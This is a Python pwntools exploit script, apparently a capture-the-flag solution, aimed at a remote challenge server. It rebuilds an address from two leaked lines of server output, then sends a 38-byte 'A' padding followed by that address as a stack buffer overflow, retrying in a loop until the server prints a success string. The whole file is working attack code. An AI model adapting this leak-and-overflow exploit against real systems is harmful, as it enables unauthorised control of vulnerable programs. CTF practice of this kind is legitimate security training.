from pwn import *
from random import randrange

# offset 38
while True:
    #r = remote('localhost', 6969)
    r = remote('ctf.pragyan.org', 17000)
    #r = process('./gpsu')

    leak = '0x'
    r.recvline()
    # First leak
    leak1 = r.recvline().replace(' ','').replace('|','').strip()
    r.recvline()
    r.recvline()
    r.recvline()
    r.recvline()
    r.recvline()

    # Second leak
    leak2 = r.recvline().replace(' ','').replace('|','').strip()
    r.recvline()

    for x in range(4):
      leak += leak1[x]
      leak += leak2[x]

    #leak += '{}26d'.format(hex(randrange(16))[-1])
    leak += '526d'
    print(leak)

    leak = int(leak,16)

    payload = ''
    payload += 'A'*38
    payload += p64(leak)
    try:
      r.sendline(payload)
      output = r.recvall()
      print output
      if 'Toy' in output:
        #r.recvline()
        #print r.recvline()
        r.close()
        break
    except Exception as e:
      print(e)
      r.close()
      continue
